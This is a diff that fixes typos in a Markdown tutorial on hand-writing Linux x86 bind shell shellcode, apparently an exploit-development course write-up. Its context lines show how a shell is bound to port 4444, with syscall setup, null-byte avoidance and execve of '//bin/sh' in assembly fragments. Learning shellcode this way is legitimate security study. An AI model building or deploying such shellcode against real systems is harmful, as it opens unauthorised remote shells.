@@ -16,7 +16,7 @@ It is mostly used within payload sent to remote application which is vulnerable 
 
 ## Prototype ##
 
-To get idea how bind shell works and which syscalls are used/needed, we can create prototye of bind shell code in C.  
+To get idea how bind shell works and which syscalls are used/needed, we can create prototype of bind shell code in C.  
 
 ```
 #define _GNU_SOURCE # added to avoid gcc's implicit declaration of function warning
@@ -92,7 +92,7 @@ Syscall               Dec   Hex
 #define __NR_execve   11    0xB
 ```
 
-Each syscall and its arguments are defined in man 2 pages in form of C function. In order to find out which argments are needed we need to look at man pages. 
+Each syscall and its arguments are defined in man 2 pages in form of C function. In order to find out which arguments are needed we need to look at man pages. 
 Based on man 2 pages for socket syscall (`man 2 socket`) we can see the three arguments that need to be passed to syscall.
 
 ```
@@ -106,7 +106,7 @@ The protocol specifies a particular protocol to be used with the socket.  Normal
 Arguments are passed via registers in following order; EAX, EBX, ECX, EDX, ESI, EDI. EAX always contains syscall number (in case of socket it is decimal 359 or hex 0x167). 
 The domain, type and protocol needs to be passed in EBX, ECX and EDX registers.
   
-Assemlby instraction: `MOV EAX, value` is used to move value to EAX register. Since shell code will most probably be used within exploit, payload cannot contain null byte as null byte (\x00) terminates string and break exploit. Playing with msf-nasm_shell.rb script which is available in Kali linux we can see that opcode for MOV EAX, 0x167 contains null bytes.
+Assembly instruction: `MOV EAX, value` is used to move value to EAX register. Since shell code will most probably be used within exploit, payload cannot contain null byte as null byte (\x00) terminates string and break exploit. Playing with msf-nasm_shell.rb script which is available in Kali linux we can see that opcode for MOV EAX, 0x167 contains null bytes.
 ```
 nasm > mov eax, 0x167
 00000000  B867010000        mov eax, 0x167
@@ -154,7 +154,7 @@ nasm > mov EDX, 0x6
 Null bytes ---^^^^^^
 ```
 
-similar to moving value to EAX register, we can move values to BL, CL and DL wich represents first 8 bites of EBX, ECX and EDX registers. We couldn't use MOV AL, 0x167 as 0x167 requires more than 8 bits so AX had to be used.
+similar to moving value to EAX register, we can move values to BL, CL and DL which represents first 8 bites of EBX, ECX and EDX registers. We couldn't use MOV AL, 0x167 as 0x167 requires more than 8 bits so AX had to be used.
 
 ```
 nasm > mov bl, 0x2
@@ -201,7 +201,7 @@ bind() assigns the address specified by addr to the socket referred to by the fi
 addrlen specifies the size, in bytes, of the address structure pointed to by addr.
 
 In a same way as for socket syscall we need to prepare data for bind bind syscall with exception that bind is using struct sockaddr which needs to be saved on the stack. 
-In order to place some value on the stack PUSH instraction needs to be used. 
+In order to place some value on the stack PUSH instruction needs to be used. 
 Since stack grows from higher addresses to lower addresses, last argument needs to be pushed first and due to little endian format values needs to be pushed in reverse order. 
 
 ```
@@ -215,7 +215,7 @@ There is also 4th parameter: sin_zero wish is always zero. So in order to push t
 XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
 PUSH ECX         ; push zero_sin = 0 to the stack
 PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
-PUSH word 0x5c11 ; push hex 0x5c11 (dec 4444) in reverse oreder due to little endian
+PUSH word 0x5c11 ; push hex 0x5c11 (dec 4444) in reverse order due to little endian
 PUSH word 0x02   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
 ```
 
@@ -312,7 +312,7 @@ pathname must be either a binary executable, or a script starting with a line of
 argv is an array of argument strings passed to the new program.  By convention, the first of these strings (i.e., argv[0]) should  contain  the  filename associated  with  the file being executed.  envp is an array of strings, conventionally of the form key=value, which are passed as environment to the new program. 
 The argv and envp arrays must each include a null pointer at the end of the array.
 
-First we need to push values to the stack. Argv and envp need to have null pointer as well as path name must be null terminated. Since stack grovs from higher to lower memory address, first we need to push null byte and then "/bin/sh" in reverse order. Additinal remark, since "/bin/sh" takes 7 bytes, we can add another slash to have 8 bytes "//bin/sh" and avoid null bytes. 
+First we need to push values to the stack. Argv and envp need to have null pointer as well as path name must be null terminated. Since stack grovs from higher to lower memory address, first we need to push null byte and then "/bin/sh" in reverse order. Additional remark, since "/bin/sh" takes 7 bytes, we can add another slash to have 8 bytes "//bin/sh" and avoid null bytes. 
 In order to push null byte to stack, we need to zero-out EAX and push it to stack:
 
 ```
@@ -326,7 +326,7 @@ PUSH 0x68732f6E
 PUSH 0x69622f2F
 ```
 
-Then we need to place pointer to beggining of stack to EBX. ESP is pointing to the beggining of the stack and put null pointer by pushing EAX to the stack.
+Then we need to place pointer to beginning of stack to EBX. ESP is pointing to the beginning of the stack and put null pointer by pushing EAX to the stack.
 ```
 MOV EBX, ESP
 PUSH EAX
@@ -374,7 +374,7 @@ _start:
         XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
         PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
         PUSH ECX
-        PUSH word 0x5c11 ; push hex 0x115c (dec 4444) in reverse oreder due to little endian
+        PUSH word 0x5c11 ; push hex 0x115c (dec 4444) in reverse order due to little endian
         PUSH word 0x2   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
         MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
 
